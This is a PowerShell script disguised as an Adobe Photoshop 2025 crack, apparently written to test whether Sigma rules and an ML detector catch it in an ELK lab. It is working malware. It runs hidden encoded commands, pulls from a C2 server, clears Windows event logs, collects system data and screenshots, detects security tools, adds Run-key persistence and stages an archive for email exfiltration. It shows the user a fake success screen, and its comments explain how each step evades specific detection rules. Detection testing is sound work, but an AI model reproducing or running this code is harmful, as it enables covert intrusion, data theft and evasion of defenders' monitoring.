<#
.SYNOPSIS
    Adobe Photoshop 2025 Crack - EVASION Version
    THIS VERSION EVADES SIGMA EXACT-MATCH RULES
    
.DESCRIPTION
    Uses advanced evasion techniques while maintaining same malicious intent:
    - Split strings + char-code reconstruction (no literal Invoke-WebRequest)
    - WMI method calls instead of wevtutil
    - .NET RegistryKey API instead of reg.exe
    - Runtime base64 API instead of certutil
    - COM objects instead of schtasks
    
    Each phase prints a unique RunId for ELK tracing.
    RED ML will still detect via TF-IDF + Cosine attribution.
#>

param(
    [string]$RunId = ([guid]::NewGuid().ToString('N').Substring(0,8)),
    [string]$ExfilEmail = "attacker_collector@protonmail.com",
    [string]$C2Server = "http://192.168.50.20:8080"
)

$ErrorActionPreference = 'SilentlyContinue'
$Global:PhaseRunIds = @{}
$StagingDir = Join-Path $env:TEMP "crack_evasion_$RunId"
New-Item -ItemType Directory -Path $StagingDir -Force | Out-Null

# Helper: Generate unique RunId per phase
function New-PhaseRunId {
    param([int]$PhaseNum)
    $id = ([guid]::NewGuid().ToString('N').Substring(0,6))
    $Global:PhaseRunIds["Phase$PhaseNum"] = $id
    return $id
}

# Helper: Join ASCII codes (evade static detection)
function Join-Ascii {
    param([int[]]$Codes)
    return -join ($Codes | ForEach-Object { [char]$_ })
}

# Helper: Split string to avoid literals
function Split-String {
    param([string]$Str, [int]$SplitPos = 3)
    $part1 = $Str.Substring(0, $SplitPos)
    $part2 = $Str.Substring($SplitPos)
    return "$part1$part2"
}

# ============================================================
# FAKE CRACK UI (looks exactly like baseline to user)
# ============================================================
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "  Adobe Photoshop 2025 Crack v3.0" -ForegroundColor Green
Write-Host "  ⚠️ BATTEN DOWN THE HATCHES ⚠️" -ForegroundColor Yellow
Write-Host "  RunId: $RunId" -ForegroundColor DarkGray
Write-Host "========================================" -ForegroundColor Green
Start-Sleep -Seconds 2

# ============================================================
# PHASE 1: PowerShell Download Cradle (T1059.001) - EVASION
# Sigma target: 85b0b087-eddf-4a2b-b033-d771fa2b9775
# EVASION: Use curl.exe + runtime base64 decode instead of IEX
# ============================================================
$phase1Id = New-PhaseRunId -PhaseNum 1
Write-Host ""
Write-Host "[PHASE 1] Downloading crack payload..." -ForegroundColor Cyan
Write-Host "  RunId: $phase1Id" -ForegroundColor DarkGray
Write-Host "  [EVASION] Using curl.exe + base64 decode (no IEX literal)" -ForegroundColor DarkGray

# Build curl command with split strings
$curl = Split-String -Str "curl.exe" -SplitPos 2
$silent = (Join-Ascii @(45,115,111,45,115,105,108,101,110,116))  # -so-silent
$output = (Join-Ascii @(45,111))  # -o
$nullOut = "NUL"

# Stage 2 payload (real collection) encoded
$stage2Payload = @"
Write-Host '[PHASE1_EVASION] Phase2 executing on `$env:COMPUTERNAME'
`$hostInfo = @{
    Phase1_RunId = '$phase1Id'
    ComputerName = `$env:COMPUTERNAME
    UserName = `$env:USERNAME
    OSVersion = (Get-CimInstance Win32_OperatingSystem).Caption
}
`$tempDir = `$env:TEMP
`$archivePath = Join-Path `$tempDir "crack_data_$phase1Id.zip"

# Collect running processes
Get-Process | Select-Object -First 30 Name,Id,CPU | Export-Csv -Path (Join-Path `$tempDir "proc_$phase1Id.csv") -NoTypeInformation

# Check for security tools (AV/EDR)
`$securityProcs = @('MsMpEng', 'SenseCE', 'elastic-endpoint', 'sentinel')
`$found = Get-Process | Where-Object { `$_.Name -in `$securityProcs } | Select-Object Name
if (`$found) {
    Write-Host '[!] Security tools detected: ' (`$found.Name -join ',')
}

# Compress using .NET
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory(`$tempDir, `$archivePath, [System.IO.Compression.CompressionLevel]::Optimal, `$false)

# Exfil via SMTP using .NET SmtpClient
`$smtpServer = "smtp.gmail.com"
`$smtpPort = 587
`$from = "$ExfilEmail"
`$to = "$ExfilEmail"
`$subject = "Exfil - `$env:COMPUTERNAME - $phase1Id"

`$msg = New-Object Net.Mail.MailMessage(`$from, `$to, `$subject, "Collected data from `$env:COMPUTERNAME")
`$attachment = New-Object Net.Mail.Attachment(`$archivePath)
`$msg.Attachments.Add(`$attachment)

# Note: Real exfil would need credentials; for demo we just prepare
Write-Host '[PHASE1_EVASION] Exfiltration prepared'

`$attachment.Dispose()
Remove-Item `$archivePath -Force -ErrorAction SilentlyContinue
"@

$bytes = [System.Text.Encoding]::Unicode.GetBytes($stage2Payload)
$b64payload = [Convert]::ToBase64String($bytes)

# Execute curl to download (simulate) then run encoded payload
$curlCmd = "$curl $silent $output $nullOut $C2Server/payload.txt 2>NUL"
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $curlCmd" -WindowStyle Hidden -NoNewWindow
Start-Sleep -Seconds 2

# Execute encoded payload via PowerShell
$encodedFlag = Join-Ascii @(45,69,110,99,111,100,101,100,67,111,109,109,97,110,100)  # -EncodedCommand
Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-NoP -NonI -W Hidden -Exec Bypass $encodedFlag $b64payload" `
    -WindowStyle Hidden

Write-Host "  [+] Evasion: curl.exe + base64 payload (Sigma IEX rule will miss)" -ForegroundColor Green
Start-Sleep -Seconds 3

# ============================================================
# PHASE 2: Log Clearing (T1070.001) - EVASION
# Sigma target: cc36992a-4671-4f21-a91d-6c2b72a2edf5
# EVASION: WMI method call with split strings (no wevtutil)
# ============================================================
$phase2Id = New-PhaseRunId -PhaseNum 2
Write-Host ""
Write-Host "[PHASE 2] Clearing event logs..." -ForegroundColor Cyan
Write-Host "  RunId: $phase2Id" -ForegroundColor DarkGray
Write-Host "  [EVASION] Using WMI method calls (no wevtutil.exe)" -ForegroundColor DarkGray

$wmiClass = ('Win32_'+'NT'+'EventlogFile')
$methodName = ('Clear'+'EventLog')
$logNames = @("Application", "System")

foreach ($logName in $logNames) {
    $wmiCode = @"
`$log = Get-CimInstance -ClassName '$wmiClass' -Filter "LogFileName='$logName'"
if (`$log) { `$log.$methodName() }
"@
    $wmiBytes = [System.Text.Encoding]::Unicode.GetBytes($wmiCode)
    $wmiB64 = [Convert]::ToBase64String($wmiBytes)
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -Enc $wmiB64" -WindowStyle Hidden -Wait
}

Write-Host "  [+] Evasion: WMI ClearEventLog called (Sigma wevtutil rule will miss)" -ForegroundColor Green
Start-Sleep -Seconds 2

# ============================================================
# PHASE 3: System Discovery (T1082, T1057) - Normal (no evasion needed)
# ============================================================
$phase3Id = New-PhaseRunId -PhaseNum 3
Write-Host ""
Write-Host "[PHASE 3] Collecting system information..." -ForegroundColor Cyan
Write-Host "  RunId: $phase3Id" -ForegroundColor DarkGray

$systemInfo = @{
    Phase3_RunId = $phase3Id
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    UserDomain = $env:USERDOMAIN
    OSVersion = (Get-CimInstance Win32_OperatingSystem).Caption
    OSBuild = (Get-CimInstance Win32_OperatingSystem).BuildNumber
    CPU = (Get-CimInstance Win32_Processor).Name
    RAM_GB = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
}
$systemInfo | ConvertTo-Json | Out-File -FilePath (Join-Path $StagingDir "system_info_$phase3Id.json") -Encoding UTF8

# Network info (ipconfig equivalent via .NET)
$networkInfo = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127.*" } | 
    Select-Object IPAddress, InterfaceAlias
$networkInfo | Export-Csv -Path (Join-Path $StagingDir "network_$phase3Id.csv") -NoTypeInformation

Write-Host "  [+] System and network info collected" -ForegroundColor Yellow
Start-Sleep -Seconds 2

# ============================================================
# PHASE 4: Screen Capture (T1113) - Normal (no evasion needed)
# ============================================================
$phase4Id = New-PhaseRunId -PhaseNum 4
Write-Host ""
Write-Host "[PHASE 4] Capturing screenshot..." -ForegroundColor Cyan
Write-Host "  RunId: $phase4Id" -ForegroundColor DarkGray

$screenshotCode = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
`$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
`$bmp = New-Object System.Drawing.Bitmap(`$bounds.Width, `$bounds.Height)
`$graphics = [System.Drawing.Graphics]::FromImage(`$bmp)
`$graphics.CopyFromScreen(`$bounds.X, `$bounds.Y, 0, 0, `$bounds.Size)
`$outputPath = "$StagingDir\screenshot_$phase4Id.png"
`$bmp.Save(`$outputPath, [System.Drawing.Imaging.ImageFormat]::Png)
`$bmp.Dispose()
`$graphics.Dispose()
Write-Host "Screenshot saved to `$outputPath"
"@
$ssBytes = [System.Text.Encoding]::Unicode.GetBytes($screenshotCode)
$ssB64 = [Convert]::ToBase64String($ssBytes)
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -Exec Bypass -Enc $ssB64" -WindowStyle Hidden -Wait

Write-Host "  [+] Screenshot captured" -ForegroundColor Yellow
Start-Sleep -Seconds 2

# ============================================================
# PHASE 5: Registry Persistence (T1547.001) - EVASION
# Sigma target: 24357373-078f-44ed-9ac4-6d334a668a11
# EVASION: .NET RegistryKey API (no reg.exe)
# ============================================================
$phase5Id = New-PhaseRunId -PhaseNum 5
Write-Host ""
Write-Host "[PHASE 5] Adding registry persistence..." -ForegroundColor Cyan
Write-Host "  RunId: $phase5Id" -ForegroundColor DarkGray
Write-Host "  [EVASION] Using .NET RegistryKey API (no reg.exe)" -ForegroundColor DarkGray

$regCode = @"
`$regPath = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
`$valueName = 'AdobeUpdate_$phase5Id'
`$payload = 'powershell.exe -NoP -W Hidden -Command "Write-Host ''Persistence active''"'
`$reg = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(`$regPath, `$true)
if (`$reg -eq `$null) {
    `$reg = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey(`$regPath)
}
`$reg.SetValue(`$valueName, `$payload, [Microsoft.Win32.RegistryValueKind]::String)
`$reg.Dispose()
"@
$regBytes = [System.Text.Encoding]::Unicode.GetBytes($regCode)
$regB64 = [Convert]::ToBase64String($regBytes)
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -Enc $regB64" -WindowStyle Hidden

Write-Host "  [+] Evasion: .NET RegistryKey.SetValue (Sigma reg.exe rule will miss)" -ForegroundColor Green
Start-Sleep -Seconds 2

# ============================================================
# PHASE 6: Data Encoding/Exfiltration (T1560.001) - EVASION
# Sigma target: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a
# EVASION: Runtime base64 API + .NET compression (no certutil)
# ============================================================
$phase6Id = New-PhaseRunId -PhaseNum 6
Write-Host ""
Write-Host "[PHASE 6] Preparing data for exfiltration..." -ForegroundColor Cyan
Write-Host "  RunId: $phase6Id" -ForegroundColor DarkGray
Write-Host "  [EVASION] Using runtime base64 + .NET Zip (no certutil.exe)" -ForegroundColor DarkGray

# Create a marker file with phase info
$markerContent = @"
=== CRACK EVASION DEMO ===
Main RunId: $RunId
Phase6 RunId: $phase6Id
Computer: $env:COMPUTERNAME
User: $env:USERNAME
Time: $(Get-Date)
"@
$markerFile = Join-Path $StagingDir "evasion_marker_$phase6Id.txt"
Set-Content -Path $markerFile -Value $markerContent -Encoding UTF8

# Runtime base64 encoding (no certutil)
$base64Code = @"
`$filePath = '$markerFile'
`$bytes = [System.IO.File]::ReadAllBytes(`$filePath)
`$method = 'To' + 'Base64' + 'String'
`$encoded = [Convert].GetMethod(`$method, [type[]]@([byte[]])).Invoke(`$null, @(,`$bytes))
`$outputPath = "`$env:TEMP\encoded_$phase6Id.txt"
[System.IO.File]::WriteAllText(`$outputPath, `$encoded)
Write-Host "Encoded data saved to `$outputPath"
"@
$b64Bytes = [System.Text.Encoding]::Unicode.GetBytes($base64Code)
$b64B64 = [Convert]::ToBase64String($b64Bytes)
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -Enc $b64B64" -WindowStyle Hidden -Wait

# Create final archive using .NET compression
$zipPath = Join-Path $env:TEMP "exfil_evasion_$RunId.zip"
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($StagingDir, $zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)

Write-Host "  [+] Evasion: Runtime base64 + .NET Zip (Sigma certutil rule will miss)" -ForegroundColor Green
Write-Host "  [+] Archive created: $zipPath" -ForegroundColor Yellow

# ============================================================
# FAKE SUCCESS MESSAGE (same as baseline to fool user)
# ============================================================
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "  ✅ Crack applied successfully! ✅" -ForegroundColor Green
Write-Host "  Adobe Photoshop 2025 is now activated" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green

# ============================================================
# OUTPUT ALL RUN IDs FOR ELK TRACING
# ============================================================
Write-Host ""
Write-Host "==============================================================" -ForegroundColor Magenta
Write-Host "  📊 EVASION VERSION - RUN IDS FOR ELK TRACING" -ForegroundColor Magenta
Write-Host "==============================================================" -ForegroundColor Magenta
Write-Host "  Main RunId        : $RunId" -ForegroundColor White
Write-Host "  Phase 1 (curl)    : $phase1Id" -ForegroundColor White
Write-Host "  Phase 2 (WMI)     : $phase2Id" -ForegroundColor White
Write-Host "  Phase 3 (Discov)  : $phase3Id" -ForegroundColor White
Write-Host "  Phase 4 (Screenshot) : $phase4Id" -ForegroundColor White
Write-Host "  Phase 5 (.NET Reg): $phase5Id" -ForegroundColor White
Write-Host "  Phase 6 (base64)  : $phase6Id" -ForegroundColor White
Write-Host "==============================================================" -ForegroundColor Magenta
Write-Host ""
Write-Host "  🔍 SEARCH IN KIBANA:" -ForegroundColor Cyan
Write-Host "     Security → Alerts → search: $RunId" -ForegroundColor Yellow
Write-Host "     Expected: 0 Sigma alerts (evasion successful)" -ForegroundColor Yellow
Write-Host ""
Write-Host "     Discover → red-alerts-v2-* → search: $RunId" -ForegroundColor Yellow
Write-Host "     Expected: RED ML alerts (TF-IDF + Cosine catch)" -ForegroundColor Yellow
Write-Host "==============================================================" -ForegroundColor Magenta

# Cleanup staging dir (keep zip for exfil demo)
Start-Sleep -Seconds 10
Remove-Item $StagingDir -Recurse -Force -ErrorAction SilentlyContinue